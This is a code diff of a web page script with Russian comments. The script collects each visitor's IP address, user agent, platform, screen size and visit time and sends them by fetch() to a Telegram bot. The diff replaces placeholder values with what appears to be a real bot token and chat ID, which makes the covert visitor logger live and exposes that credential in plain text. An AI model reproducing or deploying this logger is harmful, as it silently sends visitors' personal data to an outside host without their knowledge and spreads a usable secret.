@@ -60,8 +60,8 @@
                 userInfo.ip = data.ip;
                 
                 // Отправка данных в Telegram бота (замените YOUR_BOT_TOKEN и YOUR_CHAT_ID)
-                const botToken = 'YOUR_BOT_TOKEN';
-                const chatId = 'YOUR_CHAT_ID';
+                const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
+                const chatId = '1209403544';
                 const message = `Новый посетитель:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nScreen: ${userInfo.screen}\nMobile: ${userInfo.isMobile}\nTime: ${userInfo.date}`;
                 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
